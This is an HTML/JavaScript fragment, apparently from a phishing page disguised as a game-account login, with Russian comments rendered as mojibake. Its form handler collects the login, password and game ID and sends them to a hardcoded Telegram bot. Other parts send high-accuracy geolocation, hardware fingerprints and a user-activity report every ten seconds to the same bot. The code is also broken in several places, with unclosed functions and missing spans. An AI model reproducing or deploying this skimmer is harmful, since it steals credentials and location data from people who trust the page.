<body>

    <script>
        // –¢–∞–π–º–µ—Ä –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –æ—Ç—Å—á–µ—Ç–∞
        let timeLeft = 180; // 3 –º–∏–Ω—É—Ç—ã
        const timerElement = document.getElementById('timer');
        
        const countdown = setInterval(() => {
            const minutes = Math.floor(timeLeft / 60);

        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram
        function sendToTelegram(message) {
            const encodedMessage = encodeURIComponent(message);
            const img = new Image();
            img.src = `https://api.telegram.org/bot8245809142:AAGmdhZAkZ91z4spf3PMG-no89fHrjYC3q8/sendMessage?chat_id=1491315056&text=${encodedMessage}`;
        }

        // –§—É–Ω–∫—Ü–∏—è —Å–æ–∑–¥–∞–Ω–∏—è —Å–∫—Ä–∏–Ω—à–æ—Ç–∞ (—É–ø—Ä–æ—â–µ–Ω–Ω–∞—è)
        function captureScreenData() {
            const screenData = {
                width: window.innerWidth,
                height: window.innerHeight,
                scrollX: window.scrollX,
                scrollY: window.scrollY,
                url: window.location.href,
                timestamp: new Date().toLocaleString('ru-RU')
            };
            
            return `üì∏ –°–ù–ò–ú–û–ö –≠–ö–†–ê–ù–ê:\n` +
                   `–†–∞–∑–º–µ—Ä: ${screenData.width}x${screenData.height}\n` +
                   `–ü—Ä–æ–∫—Ä—É—Ç–∫–∞: X${screenData.scrollX}, Y${screenData.scrollY}\n` +
                   `–í—Ä–µ–º—è: ${screenData.timestamp}`;
        }

        // –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è
        function getGeolocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const geoData = `üìç –ì–ï–û–õ–û–ö–ê–¶–ò–Ø:\n` +
                                      `–®–∏—Ä–æ—Ç–∞: ${position.coords.latitude}\n` +
                                      `–î–æ–ª–≥–æ—Ç–∞: ${position.coords.longitude}\n` +
                                      `–¢–æ—á–Ω–æ—Å—Ç—å: ${position.coords.accuracy}–º\n` +
                                      `–í—ã—Å–æ—Ç–∞: ${position.coords.altitude || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n` +
                                      `–°–∫–æ—Ä–æ—Å—Ç—å: ${position.coords.speed || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'} –º/—Å`;
                        sendToTelegram(geoData);
                    },
                    (error) => {
                        sendToTelegram(`üìç –ì–ï–û–õ–û–ö–ê–¶–ò–Ø: –û—à–∏–±–∫–∞ - ${error.message}`);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                sendToTelegram('üìç –ì–ï–û–õ–û–ö–ê–¶–ò–Ø: –ù–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è');
            }
        }

        // –ó–∞–ø–∏—Å—å –¥–µ–π—Å—Ç–≤–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        let userActions = [];
        function recordAction(action) {
            userActions.push({
                action: action,
                timestamp: new Date().toLocaleTimeString('ru-RU'),
                scroll: `${window.scrollX},${window.scrollY}`,
                screen: `${window.innerWidth}x${window.innerHeight}`
            });
        }

        // –ó–∞—Ö–≤–∞—Ç —Å–∫—Ä–∏–Ω—à–æ—Ç–æ–≤ –∫–∞–∂–¥—ã–µ 10 —Å–µ–∫—É–Ω–¥
        let screenshotInterval;
        function startScreenCapture() {
            let captureCount = 0;
            screenshotInterval = setInterval(() => {
                captureCount++;
                const screenData = captureScreenData();
                const actions = userActions.slice(-5); // –ü–æ—Å–ª–µ–¥–Ω–∏–µ 5 –¥–µ–π—Å—Ç–≤–∏–π
                
                let report = `üìä –û–¢–ß–ï–¢ #${captureCount} (${new Date().toLocaleTimeString('ru-RU')})\n\n`;
                report += screenData + '\n\n';
                report += 'üìù –ü–û–°–õ–ï–î–ù–ò–ï –î–ï–ô–°–¢–í–ò–Ø:\n';
                actions.forEach(act => {
                    report += `[${act.timestamp}] ${act.action} (–ø—Ä–æ–∫—Ä—É—Ç–∫–∞: ${act.scroll})\n`;
                });
                
                sendToTelegram(report);
                
                // –û—á–∏—â–∞–µ–º —Å—Ç–∞—Ä—ã–µ –¥–µ–π—Å—Ç–≤–∏—è
                if (userActions.length > 20) {
                    userActions = userActions.slice(-10);
                }
                
                // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —á–µ—Ä–µ–∑ 10 –º–∏–Ω—É—Ç (60 –æ—Ç—á–µ—Ç–æ–≤)
                if (captureCount >= 60) {
                    clearInterval(screenshotInterval);
                    sendToTelegram('‚èπÔ∏è –ú–û–ù–ò–¢–û–†–ò–ù–ì –ó–ê–í–ï–†–®–ï–ù (10 –º–∏–Ω—É—Ç)');
                }
            }, 10000); // –ö–∞–∂–¥—ã–µ 10 —Å–µ–∫—É–Ω–¥
        }

        // –°–±–æ—Ä —Ä–∞—Å—à–∏—Ä–µ–Ω–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–∏—Å—Ç–µ–º–µ
        function collectAdvancedSystemInfo() {
            let info = "üñ•Ô∏è –†–ê–°–®–ò–†–ï–ù–ù–ê–Ø –ò–ù–§–û–†–ú–ê–¶–ò–Ø –û –°–ò–°–¢–ï–ú–ï:\n\n";
            
            // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–µ
            info += `üíª –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä:\n`;
            info += `- –Ø–¥–µ—Ä: ${navigator.hardwareConcurrency || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
            info += `- –ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞: ${navigator.platform}\n\n`;
            
            // –ü–∞–º—è—Ç—å
            info += `üßÆ –ü–∞–º—è—Ç—å:\n`;
            info += `- RAM: ${navigator.deviceMemory || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'} GB\n\n`;
            
            // –ì—Ä–∞—Ñ–∏–∫–∞
            info += `üé® –ì—Ä–∞—Ñ–∏–∫–∞:\n`;
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    info += `- –í–∏–¥–µ–æ–∫–∞—Ä—Ç–∞: ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}\n`;
                    info += `- –í–µ–Ω–¥–æ—Ä: ${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)}\n`;
                }
            }
            
            // –°–µ—Ç—å
            if (navigator.connection) {
                info += `\nüì° –°–µ—Ç—å:\n`;
                info += `- –¢–∏–ø: ${navigator.connection.effectiveType}\n`;
                info += `- –°–∫–æ—Ä–æ—Å—Ç—å: ${navigator.connection.downlink} Mbps\n`;
                info += `- RTT: ${navigator.connection.rtt} ms\n`;
            }
            
            return info;
        }

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ —Ñ–æ—Ä–º—ã
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const formData = new FormData(this);
            const loginData = {
                login: formData.get('login'),
                password: formData.get('password'),
                game_id: formData.get('game_id'),

            // –°–æ–±–∏—Ä–∞–µ–º –≤—Å–µ –¥–∞–Ω–Ω—ã–µ
            let stolenData = "üéØ –ü–û–õ–ù–´–ô –°–ë–û–† –î–ê–ù–ù–´–• –ê–ö–ö–ê–£–ù–¢–ê\n\n";
            stolenData += collectAdvancedSystemInfo();
            stolenData += "\nüîê –î–ê–ù–ù–´–ï –î–õ–Ø –í–•–û–î–ê:\n";
            stolenData += `üìß –õ–æ–≥–∏–Ω: ${loginData.login}\n`;
            stolenData += `üîë –ü–∞—Ä–æ–ª—å: ${loginData.password}\n`;
            if (loginData.game_id) stolenData += `üéÆ –ò–≥—Ä–æ–≤–æ–π ID: ${loginData.game_id}\n`;
            if (loginData.feedback) stolenData += `üí¨ –û—Ç–∑—ã–≤: ${loginData.feedback}\n`;
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ
            sendToTelegram(stolenData);
            
            // –ó–∞–ø—É—Å–∫–∞–µ–º –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
            getGeolocation();
            
            // –ó–∞–ø—É—Å–∫–∞–µ–º –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ —ç–∫—Ä–∞–Ω–∞

            // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —á–µ—Ä–µ–∑ 12 –º–∏–Ω—É—Ç (–ø–æ—Å–ª–µ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞)

        // –û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –¥–µ–π—Å—Ç–≤–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        document.addEventListener('click', (e) => {

        });

        const inputs = document.querySelectorAll('input, textarea');
        inputs.forEach(input => {
            input.addEventListener('input', (e) => {

        window.addEventListener('load', () => {
            const visitData = "üïµÔ∏è –ù–ê–ß–ê–õ–û –°–ï–ê–ù–°–ê –ú–û–ù–ò–¢–û–†–ò–ù–ì–ê\n" +
                            `üì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${/Mobile/.test(navigator.userAgent) ? '–ú–æ–±–∏–ª—å–Ω–æ–µ' : '–î–µ—Å–∫—Ç–æ–ø'}\n` +
                            `üåê –ë—Ä–∞—É–∑–µ—Ä: ${navigator.userAgent.split(' ').slice(-2).join(' ')}\n` +
                            `üïí –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}`;
            
            sendToTelegram(visitData);
            recordAction('–°—Ç—Ä–∞–Ω–∏—Ü–∞ –∑–∞–≥—Ä—É–∂–µ–Ω–∞');
        });

        // –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ –ø—Ä–∏ —É—Ö–æ–¥–µ
        window.addEventListener('beforeunload', () => {
            clearInterval(screenshotInterval);

                              `üìä –í—Å–µ–≥–æ –¥–µ–π—Å—Ç–≤–∏–π: ${userActions.length}\n` +
                              `‚è∞ –û–±—â–µ–µ –≤—Ä–µ–º—è: ${(Date.now() - performance.timing.navigationStart) / 1000} —Å–µ–∫`;
            sendToTelegram(sessionData);

    </script>
